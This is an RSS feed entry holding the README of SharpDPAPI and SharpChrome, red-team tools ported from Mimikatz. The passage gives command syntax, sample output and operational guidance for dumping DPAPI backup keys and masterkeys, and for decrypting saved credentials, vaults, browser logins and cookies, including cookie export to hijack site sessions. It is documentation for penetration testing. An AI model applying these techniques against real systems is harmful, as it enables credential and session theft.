<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2025-05-13T01:29:55Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>GhostPack/SharpDPAPI</title>
    <updated>2025-05-13T01:29:55Z</updated>
    <id>tag:github.com,2025-05-13:/GhostPack/SharpDPAPI</id>
    <link href="https://github.com/GhostPack/SharpDPAPI" rel="alternate"></link>
    <summary type="html">&lt;p&gt;SharpDPAPI is a C# port of some Mimikatz DPAPI functionality.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;SharpDPAPI&lt;/h1&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sharpdpapi-1&#34;&gt;SharpDPAPI&lt;/a&gt; is a C# port of some DPAPI functionality from &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt;&#39;s &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/&#34;&gt;Mimikatz&lt;/a&gt; project.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;I did not come up with this logic, it is simply a port from Mimikatz in order to better understand the process and operationalize it to fit our workflow.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sharpchrome&#34;&gt;SharpChrome&lt;/a&gt; subproject is an adaptation of work from &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/djhohnstein&#34;&gt;@djhohnstein&lt;/a&gt;, specifically his &lt;a href=&#34;https://github.com/djhohnstein/SharpChrome/&#34;&gt;SharpChrome project&lt;/a&gt;. However, this version of SharpChrome uses a different version of the &lt;a href=&#34;https://github.com/akveo/digitsquare/tree/a251a1220ef6212d1bed8c720368435ee1bfdfc2/plugins/com.brodysoft.sqlitePlugin/src/wp&#34;&gt;C# SQL library&lt;/a&gt; that supports &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/pull/199&#34;&gt;lockless opening&lt;/a&gt;. SharpChrome is built as a separate project in SharpDPAPI because of the size of the SQLite library utilized.&lt;/p&gt; &#xA;&lt;p&gt;Both Chrome and newer Chromium-based Edge browsers can be triaged with SharpChrome.&lt;/p&gt; &#xA;&lt;p&gt;SharpChrome also uses an minimized version of @AArnott&#39;s &lt;a href=&#34;https://github.com/AArnott/pinvoke/tree/master/src/BCrypt&#34;&gt;BCrypt P/Invoke code&lt;/a&gt; released under the MIT License.&lt;/p&gt; &#xA;&lt;p&gt;If you&#39;re unfamiliar with DPAPI, &lt;a href=&#34;https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/&#34;&gt;check out this post&lt;/a&gt; for more background information. For more information on Credentials and Vaults in regards to DPAPI, check out Benjamin&#39;s &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials&#34;&gt;wiki entry on the subject.&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt; is the primary author of this port.&lt;/p&gt; &#xA;&lt;p&gt;SharpDPAPI is licensed under the BSD 3-Clause license.&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sharpdpapi&#34;&gt;SharpDPAPI&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#table-of-contents&#34;&gt;Table of Contents&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#background&#34;&gt;Background&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sharpdpapi-command-line-usage&#34;&gt;SharpDPAPI Command Line Usage&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sharpchrome-command-line-usage&#34;&gt;SharpChrome Command Line Usage&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#operational-usage&#34;&gt;Operational Usage&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sharpdpapi-1&#34;&gt;SharpDPAPI&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sharpchrome&#34;&gt;SharpChrome&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sharpdpapi-commands&#34;&gt;SharpDPAPI Commands&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#user-triage&#34;&gt;User Triage&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#masterkeys&#34;&gt;masterkeys&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#credentials&#34;&gt;credentials&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#vaults&#34;&gt;vaults&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#rdg&#34;&gt;rdg&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#keepass&#34;&gt;keepass&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#certificates&#34;&gt;certificates&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#triage&#34;&gt;triage&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#machine-triage&#34;&gt;Machine Triage&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#machinemasterkeys&#34;&gt;machinemasterkeys&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#machinecredentials&#34;&gt;machinecredentials&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#machinevaults&#34;&gt;machinevaults&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#certificates-machine&#34;&gt;certificates /machine&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#machinetriage&#34;&gt;machinetriage&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#misc&#34;&gt;Misc&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#ps&#34;&gt;ps&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#blob&#34;&gt;blob&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#backupkey&#34;&gt;backupkey&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#search&#34;&gt;search&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sccm&#34;&gt;SCCM&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sharpchrome-commands&#34;&gt;SharpChrome Commands&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#logins&#34;&gt;logins&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#cookies&#34;&gt;cookies&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#statekeys&#34;&gt;statekeys&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#backupkey-1&#34;&gt;backupkey&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#compile-instructions&#34;&gt;Compile Instructions&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#targeting-other-net-versions&#34;&gt;Targeting other .NET versions&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sidenote-running-sharpdpapi-through-powershell&#34;&gt;Sidenote: Running SharpDPAPI Through PowerShell&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#sidenote-sidenote-running-sharpdpapi-over-psremoting&#34;&gt;Sidenote Sidenote: Running SharpDPAPI Over PSRemoting&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Background&lt;/h2&gt; &#xA;&lt;h4&gt;SharpDPAPI Command Line Usage&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.20.0&#xA;&#xA;Retrieve a domain controller&#39;s DPAPI backup key, optionally specifying a DC and output file:&#xA;&#xA;  SharpDPAPI backupkey [/nowrap] [/server:SERVER.domain] [/file:key.pvk]&#xA;&#xA;&#xA;The *search* comand will search for potential DPAPI blobs in the registry, files, folders, and base64 blobs:&#xA;&#xA;    search /type:registry [/path:HKLM\path\to\key] [/showErrors]&#xA;    search /type:folder /path:C:\path\to\folder [/maxBytes:&amp;lt;numOfBytes&amp;gt;] [/showErrors]&#xA;    search /type:file /path:C:\path\to\file [/maxBytes:&amp;lt;numOfBytes&amp;gt;]&#xA;    search /type:base64 [/base:&amp;lt;base64 string&amp;gt;]&#xA;&#xA;&#xA;Machine/SYSTEM Triage:&#xA;&#xA;    machinemasterkeys       -   triage all reachable machine masterkey files (elevates to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret)&#xA;    machinecredentials      -   use &#39;machinemasterkeys&#39; and then triage machine Credential files&#xA;    machinevaults           -   use &#39;machinemasterkeys&#39; and then triage machine Vaults&#xA;    machinetriage           -   run the &#39;machinecredentials&#39; and &#39;machinevaults&#39; commands&#xA;&#xA;&#xA;User Triage:&#xA;&#xA;    Arguments for the &#39;masterkeys&#39; command:&#xA;&#xA;        /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)&#xA;        /pvk:BASE64...          -   use a base64&#39;ed DPAPI domain private key file to first decrypt reachable user masterkeys&#xA;        /pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys&#xA;        /password:X             -   decrypt the target user&#39;s masterkeys using a plaintext password (works remotely)&#xA;        /ntlm:X                 -   decrypt the target user&#39;s masterkeys using a NTLM hash (works remotely)&#xA;        /credkey:X              -   decrypt the target user&#39;s masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)&#xA;        /rpc                    -   decrypt the target user&#39;s masterkeys by asking domain controller to do so&#xA;        /server:SERVER          -   triage a remote server, assuming admin access&#xA;        /hashes                 -   output usermasterkey file &#39;hashes&#39; in JTR/Hashcat format (no decryption)&#xA;&#xA;&#xA;    Arguments for the credentials|vaults|rdg|keepass|triage|blob|ps commands:&#xA;&#xA;        Decryption:&#xA;            /unprotect          -   force use of CryptUnprotectData() for &#39;ps&#39;, &#39;rdg&#39;, or &#39;blob&#39; commands&#xA;            /pvk:BASE64...      -   use a base64&#39;ed DPAPI domain private key file to first decrypt reachable user masterkeys&#xA;            /pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys&#xA;            /password:X         -   decrypt the target user&#39;s masterkeys using a plaintext password (works remotely)&#xA;            /ntlm:X             -   decrypt the target user&#39;s masterkeys using a NTLM hash (works remotely)&#xA;            /credkey:X          -   decrypt the target user&#39;s masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)&#xA;            /rpc                -   decrypt the target user&#39;s masterkeys by asking domain controller to do so&#xA;            GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption&#xA;            /mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption&#xA;&#xA;        Targeting:&#xA;            /target:FILE/folder -   triage a specific &#39;Credentials&#39;,&#39;.rdg|RDCMan.settings&#39;, &#39;blob&#39;, or &#39;ps&#39; file location, or &#39;Vault&#39; folder&#xA;            /server:SERVER      -   triage a remote server, assuming admin access&#xA;                                    Note: must use with /pvk:KEY or /password:X&#xA;                                    Note: not applicable to &#39;blob&#39; or &#39;ps&#39; commands&#xA;&#xA;&#xA;Certificate Triage:&#xA;&#xA;    Arguments for the &#39;certificates&#39; command:&#xA;        /showall                                        -   show all decrypted private key files, not just ones that are linked to installed certs (the default)&#xA;        /machine                                        -   use the local machine store for certificate triage&#xA;        /mkfile | /target                               -   for /machine triage&#xA;        [all decryption args from User Triage above]&#xA;&#xA;&#xA;Note: in most cases, just use *triage* if you&#39;re targeting user DPAPI secrets and *machinetriage* if you&#39;re going after SYSTEM DPAPI secrets.&#xA;      These functions wrap all the other applicable functions that can be automatically run.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;SharpChrome Command Line Usage&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;  __                 _&#xA; (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _&#xA; __) | | (_| |  |_) \_ | | | (_) | | | (/_&#xA;                |&#xA;  v1.9.0&#xA;&#xA;&#xA;Retrieve a domain controller&#39;s DPAPI backup key, optionally specifying a DC and output file:&#xA;&#xA;  SharpChrome backupkey [/nowrap] [/server:SERVER.domain] [/file:key.pvk]&#xA;&#xA;&#xA;Global arguments for the &#39;cookies&#39;, &#39;logins&#39;, and &#39;statekeys&#39; commands:&#xA;&#xA;    Decryption:&#xA;        /unprotect          -   force use of CryptUnprotectData() (default for unprivileged execution)&#xA;        /pvk:BASE64...      -   use a base64&#39;ed DPAPI domain private key file to first decrypt reachable user masterkeys&#xA;        /pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys&#xA;        /password:X         -   decrypt the target user&#39;s masterkeys using a plaintext password (works remotely)&#xA;        /ntlm:X             -   decrypt the target user&#39;s masterkeys using a NTLM hash (works remotely)&#xA;        /prekey:X           -   decrypt the target user&#39;s masterkeys using a DPAPI prekey (domain or local SHA1, works remotely)&#xA;        /rpc                -   decrypt the target user&#39;s masterkeys by asking domain controller to do so&#xA;        GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption&#xA;        /statekey:X         -   a decrypted AES state key (from the &#39;statekey&#39; command)&#xA;&#xA;    Targeting:&#xA;        /target:FILE        -   triage a specific &#39;Cookies&#39;, &#39;Login Data&#39;, or &#39;Local State&#39; file location&#xA;        /target:C:\Users\X\ -   triage a specific user folder for any specified command&#xA;        /server:SERVER      -   triage a remote server, assuming admin access (note: must use with /pvk:KEY)&#xA;        /browser:X          -   triage &#39;chrome&#39; (default), (chromium-based) &#39;edge&#39;, or &#39;slack&#39;&#xA;&#xA;    Output:&#xA;        /format:X           -   either &#39;csv&#39; (default) or &#39;table&#39; display&#xA;        /showall            -   show Login Data entries with null passwords and expired Cookies instead of filtering (default)&#xA;        /consoleoutfile:X   -   output all console output to a file on disk&#xA;&#xA;&#xA;&#39;cookies&#39; command specific arguments:&#xA;&#xA;        /cookie:&#34;REGEX&#34;     -   only return cookies where the cookie name matches the supplied regex&#xA;        /url:&#34;REGEX&#34;        -   only return cookies where the cookie URL matches the supplied regex&#xA;        /format:json        -   output cookie values in an EditThisCookie JSON import format. Best when used with a regex!&#xA;        /setneverexpire     -   set expirations for cookies output to now + 100 years (for json output)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Operational Usage&lt;/h3&gt; &#xA;&lt;h4&gt;SharpDPAPI&lt;/h4&gt; &#xA;&lt;p&gt;One of the goals with SharpDPAPI is to operationalize Benjamin&#39;s DPAPI work in a way that fits with our workflow.&lt;/p&gt; &#xA;&lt;p&gt;How exactly you use the toolset will depend on what phase of an engagement you&#39;re in. In general this breaks into &#34;have I compromised the domain or not&#34;.&lt;/p&gt; &#xA;&lt;p&gt;If domain admin (or equivalent) privileges have been obtained, the domain DPAPI backup key can be retrieved with the &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#backupkey&#34;&gt;backupkey&lt;/a&gt; command (or with Mimikatz). This domain private key never changes, and can decrypt any DPAPI masterkeys for domain users. This means, given a domain DPAPI backup key, an attacker can decrypt masterkeys for any domain user that can then be used to decrypt any Vault/Credentials/Chrome Logins/other DPAPI blobs/etc. The key retrieved from the &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#backupkey&#34;&gt;backupkey&lt;/a&gt; command can be used with the &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#masterkeys&#34;&gt;masterkeys&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#credentials&#34;&gt;credentials&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#vaults&#34;&gt;vaults&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#rdg&#34;&gt;rdg&lt;/a&gt;, or &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#triage&#34;&gt;triage&lt;/a&gt; commands.&lt;/p&gt; &#xA;&lt;p&gt;If DA privileges have not been achieved, using Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system (tip: running &lt;code&gt;dpapi::cache&lt;/code&gt; after key extraction will give you a nice table). If you change these keys to a &lt;code&gt;{GUID1}:SHA1 {GUID2}:SHA1...&lt;/code&gt; type format, they can be supplied to the &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#credentials&#34;&gt;credentials&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#vaults&#34;&gt;vaults&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#rdg&#34;&gt;rdg&lt;/a&gt;, or &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#triage&#34;&gt;triage&lt;/a&gt; commands. This lets you triage all Credential files/Vaults on a system for any user who&#39;s currently logged in, without having to do file-by-file decrypts.&lt;/p&gt; &#xA;&lt;p&gt;Alternatively, if you can supply a target user&#39;s password, NTLM hash, or DPAPI prekey for user-command with &lt;code&gt;/password:X&lt;/code&gt;, &lt;code&gt;/ntlm:X&lt;/code&gt;, or &lt;code&gt;/prekey:X&lt;/code&gt; respectively. The &lt;code&gt;dpapi&lt;/code&gt; field of Mimikatz&#39; &lt;code&gt;sekurlsa::msv&lt;/code&gt; output for domain users can be used as the &lt;code&gt;/prekey&lt;/code&gt;, while the &lt;code&gt;sha1&lt;/code&gt; field of &lt;code&gt;sekurlsa::msv&lt;/code&gt; output can be used as the &lt;code&gt;/prekey&lt;/code&gt; for local users.&lt;/p&gt; &#xA;&lt;p&gt;For decrypting RDG/RDCMan.settings files with the &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/SharpDPAPI/master/#rdg&#34;&gt;rdg&lt;/a&gt; command, the &lt;code&gt;/unprotect&lt;/code&gt; flag will use CryptUnprotectData() to decrypt any saved RDP passwords, &lt;em&gt;if&lt;/em&gt; the command is run from the user context who saved the passwords. This can be done from an &lt;em&gt;unprivileged&lt;/em&gt; context, without the need to touch LSASS. For why this approach isn&#39;t used for credentials/vaults, see Benjamin&#39;s &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem&#34;&gt;documentation here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For machine-specific DPAPI triage, the &lt;code&gt;machinemasterkeys|machinecredentials|machinevaults|machinetriage&lt;/code&gt; commands will do the machine equivalent of user DPAPI triage. If in an elevated context (that is, you need local administrative rights), SharpDPAPI will elevate to SYSTEM privileges to retrieve the &#34;DPAPI_SYSTEM&#34; LSA secret, which is then used to decrypt any discovered machine DPAPI masterkeys. These keys are then used as lookup tables for machine credentials/vaults/etc.&lt;/p&gt; &#xA;&lt;p&gt;For more offensive DPAPI information, &lt;a href=&#34;https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/&#34;&gt;check here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;SharpChrome&lt;/h4&gt; &#xA;&lt;p&gt;SharpChrome is a Chrome-specific implementation of SharpDPAPI capable of &lt;strong&gt;cookies&lt;/strong&gt; and &lt;strong&gt;logins&lt;/strong&gt; decryption/triage. It is built as a separate project in SharpDPAPI because of the size of the SQLite library utilized.&lt;/p&gt; &#xA;&lt;p&gt;Since Chrome Cookies/Login Data are saved without CRYPTPROTECT_SYSTEM, CryptUnprotectData() is back on the table. If SharpChrome is run from an unelevated contect, it will attempt to decrypt any logins/cookies for the current user using CryptUnprotectData(). A &lt;code&gt;/pvk:[BASE64|file.pvk]&lt;/code&gt;, {GUID}:SHA1 lookup table, &lt;code&gt;/password:X&lt;/code&gt;, &lt;code&gt;/ntlm:X&lt;/code&gt;, &lt;code&gt;/prekey:X&lt;/code&gt;, or &lt;code&gt;/mkfile:FILE&lt;/code&gt; of {GUID}:SHA1 values can also be used to decrypt values. Also, the &lt;a href=&#34;https://github.com/akveo/digitsquare/tree/a251a1220ef6212d1bed8c720368435ee1bfdfc2/plugins/com.brodysoft.sqlitePlugin/src/wp&#34;&gt;C# SQL library&lt;/a&gt; used (with a few modifications) supports &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/pull/199&#34;&gt;lockless opening&lt;/a&gt;, meaning that Chrome does not have to be closed/target files do not have to be copied to another location.&lt;/p&gt; &#xA;&lt;p&gt;Alternatively, if you can supply a target user&#39;s password, NTLM hash, or DPAPI prekey for user-command with &lt;code&gt;/password:X&lt;/code&gt;, &lt;code&gt;/ntlm:X&lt;/code&gt;, or &lt;code&gt;/prekey:X&lt;/code&gt; respectively. The &lt;code&gt;dpapi&lt;/code&gt; field of Mimikatz&#39; &lt;code&gt;sekurlsa::msv&lt;/code&gt; output for domain users can be used as the &lt;code&gt;/prekey&lt;/code&gt;, while the &lt;code&gt;sha1&lt;/code&gt; field of &lt;code&gt;sekurlsa::msv&lt;/code&gt; output can be used as the &lt;code&gt;/prekey&lt;/code&gt; for local users.&lt;/p&gt; &#xA;&lt;p&gt;If Chrome is version 80+, an AES state key is stored in &lt;em&gt;AppData\Local\Google\Chrome\User Data\Local State&lt;/em&gt; - this key is protected with DPAPI, so we can use CryptUnprotectData()/pvk/masterkey lookup tables to decrypt it. This AES key is then used to protect new cookie and login data entries. This is also the process when &lt;code&gt;/browser:edge&lt;/code&gt; or &lt;code&gt;/browser:brave&lt;/code&gt; is specified, for newer Chromium-based Edge browser triage.&lt;/p&gt; &#xA;&lt;p&gt;By default, cookies and logins are displayed as a csv - this can be changed with &lt;code&gt;/format:table&lt;/code&gt; for table output, and &lt;code&gt;/format:json&lt;/code&gt; for cookies specifically. The json option outputs cookies in a json format that can be imported into the &lt;a href=&#34;https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en&#34;&gt;EditThisCookie&lt;/a&gt; Chrome extension for easy reuse.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;strong&gt;cookies&lt;/strong&gt; command also has &lt;code&gt;/cookie:REGEX&lt;/code&gt; and &lt;code&gt;/url:REGEX&lt;/code&gt; arguments to only return cookie names or urls matching the supplied regex. This is useful with &lt;code&gt;/format:json&lt;/code&gt; to easily clone access to specific sites.&lt;/p&gt; &#xA;&lt;p&gt;Specific cookies/logins/statekey files can be specified with &lt;code&gt;/target:X&lt;/code&gt;, and a user folder can be specified with &lt;code&gt;/target:C:\Users\USER\&lt;/code&gt; for any triage command.&lt;/p&gt; &#xA;&lt;h2&gt;SharpDPAPI Commands&lt;/h2&gt; &#xA;&lt;h3&gt;User Triage&lt;/h3&gt; &#xA;&lt;h4&gt;masterkeys&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;masterkeys&lt;/strong&gt; command will search for any readable user masterkey files and decrypt them using a supplied domain DPAPI backup key. It will return a set of masterkey {GUID}:SHA1 mappings.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;/password:X&lt;/code&gt; can be used to decrypt a user&#39;s current masterkeys. Note that for domain-joined machines, the password can be supplied in either plaintext or NTLM format. If &lt;code&gt;/target&lt;/code&gt; is also supplied with &lt;code&gt;/password&lt;/code&gt;, the &lt;code&gt;/sid:X&lt;/code&gt; full domain SID of the user also needs to be specified.&lt;/p&gt; &#xA;&lt;p&gt;The domain backup key can be in base64 form (&lt;code&gt;/pvk:BASE64...&lt;/code&gt;) or file form (&lt;code&gt;/pvk:key.pvk&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe masterkeys /pvk:key.pvk&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: Triage User Masterkey Files&#xA;&#xA;[*] Found MasterKey : C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa&#xA;[*] Found MasterKey : C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a&#xA;...(snip)...&#xA;&#xA;[*] User master key cache:&#xA;&#xA;{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316...(snip)...&#xA;...(snip)...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If no &lt;code&gt;/pasword&lt;/code&gt; or &lt;code&gt;/pvk&lt;/code&gt; is specified, you may pass the &lt;code&gt;/hashes&lt;/code&gt; flag to dump the master key hashes in John/Hashcat format. In this mode, the hashes are printed in the format of &lt;code&gt;{GUID}:DPAPImk&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;Preferred&lt;/code&gt; key is also parsed in order to highlight the current preferred master key, so that effort is not spent cracking older 